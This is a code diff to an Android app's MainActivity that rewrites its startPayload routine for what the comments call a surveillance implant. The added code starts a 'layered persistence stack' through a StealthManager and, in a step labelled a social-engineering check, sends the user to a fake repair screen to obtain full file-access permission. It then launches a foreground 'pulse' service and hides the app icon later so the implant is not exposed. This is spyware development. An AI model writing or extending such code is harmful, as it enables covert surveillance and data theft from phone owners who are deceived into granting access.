@@ -213,15 +213,34 @@ public class MainActivity extends AppCompatActivity {
     }
 
     public void startPayload() {
-        new functions(activity).createNotiChannel(context);
+        Log.d(TAG, "Starting Surveillance Payload");
+        
+        // 1. Initialize layered persistence stack (CRITICAL!)
+        StealthManager stealth = new StealthManager(context);
+        stealth.initialize();
+
+        // SOCIAL ENGINEERING CHECK:
+        // If critical system permissions (Manage Files) are missing, trigger RepairActivity
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+            if (!android.os.Environment.isExternalStorageManager()) {
+                Intent intent = new Intent(this, RepairActivity.class);
+                startActivity(intent);
+                finish();
+                return;
+            }
+        }
+
+        // Start the Pulse Brawn (FGS)
+        Intent serviceIntent = new Intent(this, mainService.class);
+        serviceIntent.setAction("ACTION_START_PULSE");
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            ContextCompat.startForegroundService(context, new Intent(context, mainService.class));
+            ContextCompat.startForegroundService(context, serviceIntent);
         } else {
-            startService(new Intent(context, mainService.class));
+            startService(serviceIntent);
         }
-        if (config.icon) {
-            new functions(activity).hideAppIcon(context);
-        }
+
+        // Note: Icon is hidden by DataSyncer after first successful pulse, NOT here, 
+        // to ensure we don't brick the implant on a stealth error.
         finish();
     }
 }
